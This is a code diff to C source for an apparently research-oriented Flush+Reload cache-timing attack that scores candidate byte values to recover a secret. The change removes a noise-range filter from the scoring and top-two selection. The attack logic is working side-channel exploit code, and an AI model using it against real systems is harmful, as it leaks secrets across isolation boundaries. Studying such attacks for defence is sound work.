@@ -189,20 +189,8 @@ static void stage3_make_reload_order(int *order, int n) {
     }
 }
 
-static int stage3_is_noise_candidate(int idx, int noise_range_start, int noise_range_end)
-{
-    if (idx < 0) return 1;
-    if (noise_range_start <= noise_range_end &&
-        idx >= noise_range_start && idx <= noise_range_end) {
-        return 1;
-    }
-    return 0;
-}
-
 static void stage3_find_top2(const int *scores,
                              int candidate_count,
-                             int noise_range_start,
-                             int noise_range_end,
                              int *out_top1_idx,
                              int *out_top1_score,
                              int *out_top2_idx,
@@ -213,9 +201,6 @@ static void stage3_find_top2(const int *scores,
     int top1_score = -1, top2_score = -1;
 
     for (i = 0; i < candidate_count; i++) {
-        if (stage3_is_noise_candidate(i, noise_range_start, noise_range_end))
-            continue;
-
         if (top1_idx < 0 || scores[i] > top1_score) {
             top2_idx = top1_idx;
             top2_score = top1_score;
@@ -251,9 +236,6 @@ static int stage3_backend_flush_reload_reuse_secret(
     int candidate_count;
     int rounds;
     int attack_reps;
-    int noise_range_start;
-    int noise_range_end;
-
     int results[STAGE3_MAX_CANDIDATES];
     int measured_counts[STAGE3_MAX_CANDIDATES];
     volatile uint8_t *probes[STAGE3_MAX_CANDIDATES];
@@ -273,9 +255,6 @@ static int stage3_backend_flush_reload_reuse_secret(
 
     attack_reps = cfg->attack_repetitions;
     if (attack_reps <= 0) attack_reps = 1;
-
-    noise_range_start = cfg->noise_range_start;
-    noise_range_end   = cfg->noise_range_end;
 
     memset(results, 0, sizeof(results));
     memset(measured_counts, 0, sizeof(measured_counts));
@@ -342,16 +321,13 @@ static int stage3_backend_flush_reload_reuse_secret(
             measured_counts[idx]++;
 
             // ✅ 阈值改为 g_cache_hit_threshold（运行时可调）
-            if (!stage3_is_noise_candidate(idx, noise_range_start, noise_range_end) &&
-                dt <= (uint64_t)g_cache_hit_threshold) {
+            if (dt <= (uint64_t)g_cache_hit_threshold) {
                 results[idx]++;
             }
         }
 
         stage3_find_top2(results,
                          candidate_count,
-                         noise_range_start,
-                         noise_range_end,
                          &top1_idx, &top1_score,
                          &top2_idx, &top2_score);
 
@@ -367,7 +343,8 @@ static int stage3_backend_flush_reload_reuse_secret(
             printf("STAGE3_DEBUG_ROUND[%d]_TIMES_BEGIN\n", r);
             for (i = 0; i < candidate_count; i++) {
                 int is_expected = ((int)expected_secret == i) ? 1 : 0;
-                int is_noise = stage3_is_noise_candidate(i, noise_range_start, noise_range_end);
+                /* Candidate indices are byte labels. None is noise by value. */
+                int is_noise = 0;
                 printf("STAGE3_DEBUG_ROUND[%d]_TIME[%d]=%llu EXPECTED=%d NOISE=%d SCORE=%d MEASURED=%d\n",
                        r, i,
                        (unsigned long long)times[i],
@@ -395,8 +372,6 @@ static int stage3_backend_flush_reload_reuse_secret(
 
         stage3_find_top2(results,
                          candidate_count,
-                         noise_range_start,
-                         noise_range_end,
                          &top1_idx, &top1_score,
                          &top2_idx, &top2_score);
 
